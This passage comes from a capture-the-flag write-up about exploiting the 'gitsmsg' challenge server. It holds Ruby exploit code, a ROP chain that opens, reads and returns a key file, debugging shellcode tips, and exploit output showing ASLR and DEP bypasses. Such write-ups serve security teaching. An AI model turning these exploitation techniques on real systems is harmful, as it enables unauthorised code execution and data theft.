<span class="lnr">16 </span>edit(s, <span class="Constant">1</span>, <span class="Constant">3</span>, [return_address, <span class="Constant">1</span>].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>))
<span class="lnr">17 </span>edit(s, <span class="Constant">0</span>, <span class="Constant">0</span>, [<span class="Constant">0x43434343</span>].pack(<span class="Special">&quot;</span><span class="Constant">I</span><span class="Special">&quot;</span>))
<span class="lnr">18 </span>
<span class="lnr">19 </span><span class="Comment"># Cause the main loop to return</span>
<span class="lnr">20 </span>quit(s)
</pre>

Can you guess what happens to the server?

<pre>
<span class="Type">Program</span> received signal <span class="Type">SIGSEGV</span>, <span class="Type">Segmentation</span> fault.
<span class="Constant">0x43434343</span> <span class="Statement">in</span> <span class="Constant">??</span> ()
</pre>

Yup, EIP control.

To summarize: reading the entire stack is hacky, and I doubt it will work on a 64-bit system, but it worked great in this case!

<h3>Aside: Stashing data</h3>

It's <em>really</em> easy to stash data and get the address back. I'm going to want to open and read a file, later, so I need a way to stash the file and reference it later. This documented code should explain everything:

<pre>
<span class="Comment"># Store a series of bytes in memory, and return the absolute address</span>
<span class="Comment"># to where in memory those bytes are stored</span>
<span class="rubyDefine">def</span> <span class="Identifier">stash_data</span>(s, data)
  <span class="Comment"># Store an array of doubles - this will allocate 4 bytes and overwrite 32</span>
  store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x5e5e5e5e5e5e5e5e</span>] * <span class="Constant">4</span>)

  <span class="Comment"># Store an array of bytes, which are the data. It will allocate a buffer</span>
  <span class="Comment"># in which to store these bytes, a pointer to which is written over the</span>
  <span class="Comment"># previous entry</span>
  store(s, <span class="Type">VARDATA_TYPE_BYTE_ARRAY</span>, data.bytes.to_a)

  <span class="Comment"># Get bytes 24 - 27 of the double array, which is where a pointer to the</span>
  <span class="Comment"># allocated buffer (containing 'data') will be stored</span>
  result = get(s, <span class="Constant">1</span>)[<span class="Constant">24</span>..<span class="Constant">27</span>].unpack(<span class="Special">&quot;</span><span class="Constant">I</span><span class="Special">&quot;</span>).pop

  puts(<span class="Special">&quot;</span><span class="Constant">'%s' stored at 0x%08x</span><span class="Special">&quot;</span> % [data, result])

  <span class="Statement">return</span> result
<span class="rubyDefine">end</span>
</pre>

<h3>Getting execution</h3>

So, I got this all working, and immediately stashed some simple shellcode and jumped to it. And it crashed. That means that data execution prevention&mdash;DEP&mdash;is enabled, so I can only execute code from +x sections of memory. I know how to do that fairly easily, but it was a kick in the face after all that work. Just make this easy on me, guys! :)

This isn't going to teach you how to write a ROP payload (one of my <a href='https://blog.skullsecurity.org/2013/ropasaurusrex-a-primer-on-return-oriented-programming'>past CTF blogs</a> will teach you in great detail!). But let me tell you: once you do this a couple times, it actually gets really easy!

<h4>Another aside: helpful hint on testing your exploit</h4>
Super helpful hint: the first thing I did after realizing that DEP was enabled was jump to base_addr+0x2350, which looks like this:

<pre>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE350</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE350</span> <span class="Identifier">handle_packet_00000009_quit</span>:            <span class="Comment">; CODE XREF: do_client_stuff+71j</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE350</span>                                         <span class="Comment">; DATA XREF: do_client_stuff:off_B7FFE324o</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE350</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">2</span><span class="Identifier">Ch</span>+<span class="Identifier">out_arg_0</span>], <span class="Constant">1003</span><span class="Identifier">h</span> <span class="Comment">; packet 9 returns the integer 0x00001003 then exits</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE357</span>                 <span class="Identifier">call</span>    <span class="Identifier">send_int</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE35C</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE35C</span> <span class="Identifier">loc_B7FFE35C</span>:                           <span class="Comment">; CODE XREF: do_client_stuff+5Bj</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE35C</span>                 <span class="Identifier">add</span>     <span class="Identifier">esp</span>, <span class="Constant">20</span><span class="Identifier">h</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE35F</span>                 <span class="Identifier">xor</span>     <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE361</span>                 <span class="Identifier">pop</span>     <span class="Identifier">ebx</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE362</span>                 <span class="Identifier">pop</span>     <span class="Identifier">esi</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE363</span>                 <span class="Identifier">pop</span>     <span class="Identifier">edi</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFE364</span>                 <span class="Identifier">retn</span>
</pre>

It sends out the integer 0x1003, then attempts to return (and probably crashes). But getting that 0x1003 back from the socket after writing this was exactly the push I needed to keep going: I knew my EIP-control was working. Besides returning into known-good code like that, the shellcode <tt>eb fe</tt> (jmp -2) and <tt>cd 03</tt> (debug breakpoint) are fantastic ways to debug exploits. The former never returns, and the latter crashes immediately (and gives you debug control if it's local). It's the <em>perfect</em> way to test if your code is actually being run!

<h4>Back to our originally scheduled program...</h4>

All right, let's look at our ROP chain!

<pre>
<span class="Comment"># This generates the ROP stack. It's a simple open + read + write. The</span>
<span class="Comment"># only thing I'm not proud of here is that I make an assumption about what</span>
<span class="Comment"># the file handle will be after the open() call - but it seems to reliably</span>
<span class="Comment"># be '1' in my testing</span>
<span class="rubyDefine">def</span> <span class="Identifier">get_rop</span>(file_path, base_addr, fd)
    stack = [
      <span class="Comment"># open(filename, 0)</span>
      base_addr + <span class="Type">OPEN</span>,  <span class="Comment"># open()</span>
      base_addr + <span class="Type">PPR</span>,   <span class="Comment"># pop/pop/ret</span>
      file_path,         <span class="Comment"># filename = value we created</span>
      <span class="Constant">0</span>,                 <span class="Comment"># flags</span>

      <span class="Comment"># read(fd, filename, 100) # We're re-using the filename as a buffer</span>
      base_addr + <span class="Type">READ</span>,  <span class="Comment"># read()</span>
      base_addr + <span class="Type">PPPR</span>,  <span class="Comment"># pop/pop/pop/ret</span>
      <span class="Constant">0</span>,                 <span class="Comment"># fd - Because all descriptors are closed, the first available descriptor is '0'</span>
      file_path,         <span class="Comment"># buf</span>
      <span class="Constant">100</span>,               <span class="Comment"># count</span>

      <span class="Comment"># write(fd, filename, 0)</span>
      base_addr + <span class="Type">WRITE</span>, <span class="Comment"># write()</span>
      base_addr + <span class="Type">PPPR</span>,  <span class="Comment"># pop/pop/pop/ret</span>
      fd,                <span class="Comment"># fd</span>
      file_path,         <span class="Comment"># buf</span>
      <span class="Constant">100</span>,               <span class="Comment"># count</span>

      <span class="Comment"># This was simply for testing, it sends 4 bytes then exits</span>
      <span class="Comment">#base_addr + 0x2350</span>
    ]

    <span class="Statement">return</span> stack
<span class="rubyDefine">end</span>
</pre>

Once again, this is fairly simple!

We open a file. The file_path is something we stashed earlier, and is "/home/gitsmsg/key". We return to a pop/pop/ret to clean the two arguments off the stack.

We read up to 100 bytes from the file into the place where we stashed the filename (since it's handy and writeable). We use the file handle 0, because that's the handle that's always used (all the handles are closed in the child process, and the syscall promises to use the lowest un-used handle). Hardcoding the file handle was ugly, but way easier than actually figuring it out.

We write up to 100 bytes from that buffer back to the main file descriptor of the connection&mdash;that is, back to the socket that I'm communicating through. This descriptor was obtained by reading the right place in memory.

It's simple, but it works! And if all goes according to plan, here's the exploit running:

<pre>
$ <span class="Identifier">ruby</span> <span class="Identifier">sploit</span><span class="Statement">.rb</span>
** <span class="Identifier">Initializing</span>
** <span class="Identifier">Logging</span> <span class="Identifier">in</span>
** <span class="Identifier">Stashing</span> <span class="Identifier">a</span> <span class="Identifier">path</span> <span class="Identifier">to</span> <span class="Identifier">the</span> <span class="Identifier">file</span> <span class="Identifier">on</span> <span class="Identifier">the</span> <span class="Identifier">heap</span>
'/<span class="Identifier">home</span>/<span class="Identifier">gitsmsg</span>/<span class="Identifier">key</span>' <span class="Identifier">stored</span> <span class="Identifier">at</span> <span class="Constant">0xb8c2f848</span>
** <span class="Identifier">Using</span> <span class="Identifier">a</span> <span class="Identifier">memory</span> <span class="Identifier">leak</span> <span class="Identifier">to</span> <span class="Identifier">get</span> <span class="Identifier">the</span> <span class="Identifier">base</span> <span class="Identifier">address</span> [<span class="Identifier">ASLR</span> <span class="Identifier">Bypass</span>]
... <span class="Identifier">found</span> <span class="Identifier">it</span> @ <span class="Constant">0xb77dd000</span><span class="Comment">!</span>
** <span class="Identifier">Reading</span> <span class="Identifier">the</span> <span class="Identifier">file</span> <span class="Identifier">descriptor</span> <span class="Identifier">from</span> <span class="Identifier">memory</span>
... <span class="Identifier">it</span>'<span class="Identifier">s</span> <span class="Constant">4</span><span class="Comment">!</span>
** <span class="Identifier">Searching</span> <span class="Identifier">stack</span> <span class="Identifier">memory</span> <span class="Identifier">for</span> <span class="Identifier">the</span> <span class="Identifier">return</span> <span class="Identifier">address</span> [<span class="Identifier">Another</span> <span class="Identifier">ASLR</span> <span class="Identifier">Bypass</span>]
<span class="Identifier">Reading</span> <span class="Identifier">the</span> <span class="Identifier">stack</span> (<span class="Constant">0xbf800000</span> - <span class="Constant">0xbfffffff</span>)...
... <span class="Identifier">found</span> <span class="Identifier">it</span> @ <span class="Constant">0xbfd0546c</span>
** <span class="Identifier">Generating</span> <span class="Identifier">the</span> <span class="Identifier">ROP</span> <span class="Identifier">chain</span> [<span class="Identifier">DEP</span> <span class="Identifier">Bypass</span>]
** <span class="Identifier">Writing</span> <span class="Identifier">the</span> <span class="Identifier">ROP</span> <span class="Identifier">chain</span> <span class="Identifier">to</span> <span class="Identifier">the</span> <span class="Identifier">stack</span>
** <span class="Identifier">Sending</span> <span class="Identifier">a</span> '<span class="Identifier">quit</span>' <span class="Identifier">message</span>, <span class="Identifier">to</span> <span class="Identifier">trigger</span> <span class="Identifier">the</span> <span class="Identifier">payload</span>
** <span class="Identifier">Crossing</span> <span class="Identifier">our</span> <span class="Identifier">fingers</span> <span class="Identifier">and</span> <span class="Identifier">waiting</span> <span class="Identifier">for</span> <span class="Identifier">the</span> <span class="Identifier">password</span>
<span class="Identifier">The</span> <span class="Identifier">key</span> <span class="Identifier">is</span>: <span class="Identifier">lol</span>, <span class="Identifier">tagged</span> <span class="Identifier">unions</span> <span class="Identifier">for</span> <span class="Identifier">the</span> <span class="Identifier">WIN</span><span class="Comment">!</span>
</pre>

w00t! Full exploit is <a href='https://github.com/iagox86/gits-2014/blob/master/gitsmsg/sploit.rb'>here</a>.

<h2>Conclusion</h2>

For those of you who are counting, this is a heap overflow with ASLR, DEP, stack cookies, RELRO, and safe heap unlinking. We bypass some of those, and just ignore others that don't apply, to run arbitrary code 100% reliably. I'm proud to say, it's the most difficult exploit I've ever written, and I'm thrilled I could share it with everybody!